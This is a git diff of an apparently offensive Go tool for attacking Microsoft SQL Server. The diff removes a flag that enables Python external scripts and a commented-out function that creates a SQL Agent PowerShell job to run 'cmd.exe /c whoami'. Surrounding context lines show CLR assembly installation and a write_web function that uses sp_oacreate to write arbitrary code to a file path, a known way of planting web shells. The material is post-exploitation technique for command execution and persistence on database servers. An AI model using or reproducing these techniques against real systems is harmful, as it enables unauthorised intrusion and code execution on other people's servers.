@@ -45,7 +45,6 @@ var (
 	clr               bool
 	dclr              bool
 	rlce              bool
-	plce              bool
 	upload            bool
 	install_clr       bool
 	uninstall_clr     bool
@@ -265,11 +264,6 @@ func main() {
 			Destination: &rlce,
 		},
 		&cli.BoolFlag{
-			Name:        "plce,plceopen",
-			Usage:       "python language enabled",
-			Destination: &plce,
-		},
-		&cli.BoolFlag{
 			Name:        "install_clr,in_clr",
 			Usage:       "install clr  | clr命令参考: https://github.com/uknowsec/SharpSQLTools/",
 			Destination: &install_clr,
@@ -445,11 +439,6 @@ func main() {
 		if c.IsSet("rlce") {
 			if c.Bool("rlce") {
 				Openrlce()
-			}
-		}
-		if c.IsSet("plce") {
-			if c.Bool("plce") {
-				Openplce()
 			}
 		}
 		if c.IsSet("install_clr") {
@@ -804,15 +793,6 @@ func Openrlce() {
 	}
 	defer value.Close()
 	fmt.Println("r language enabled successfully")
-}
-
-func Openplce() {
-	value, err := conn.Prepare("exec sp_execute_external_script")
-	if err != nil {
-		log.Fatal("Prepare failed:", err.Error())
-	}
-	defer value.Close()
-	fmt.Println("python language enabled successfully")
 }
 
 func Install_clr() {
@@ -1434,38 +1414,6 @@ func createAndStartJob() error {
 	}
 	return nil
 }
-
-// func os_shell_job() {
-// 	query := `
-// 	EXEC dbo.sp_add_job @job_name = N'test_powershell_job3';
-// 	EXEC sp_add_jobstep @job_name = N'test_powershell_job3', @step_name = N'test_powershell_name3', @subsystem = N'PowerShell', @command = N'c:\windows\system32\cmd.exe /c whoami /all >c:\\123.txt', @retry_attempts = 1, @retry_interval = 5;
-// 	EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job3';
-// 	EXEC dbo.sp_start_job N'test_powershell_job3';
-// `
-// 	// 执行存储过程调用
-// 	rows, err := conn.Query(query)
-// 	if err != nil {
-// 		fmt.Println("执行存储过程调用失败:", err.Error())
-// 		return
-// 	}
-// 	defer rows.Close()
-
-// 	// 处理查询结果
-// 	for rows.Next() {
-// 		var cmdOut string
-// 		err := rows.Scan(&cmdOut)
-// 		if err != nil {
-// 			fmt.Println("扫描结果失败:", err.Error())
-// 			return
-// 		}
-// 		fmt.Println("命令输出:", cmdOut)
-// 	}
-
-// 	if err = rows.Err(); err != nil {
-// 		fmt.Println("处理查询结果失败:", err.Error())
-// 		return
-// 	}
-// }
 
 func write_web() {
 	rows, err := conn.Query(`declare @o int, @f int, @t int, @ret int;exec sp_oacreate 'scripting.filesystemobject', @o out;exec sp_oamethod @o, 'createtextfile', @f out, '` + path + `', 1;exec @ret = sp_oamethod @f, 'writeline', NULL,'` + code + `';--`)
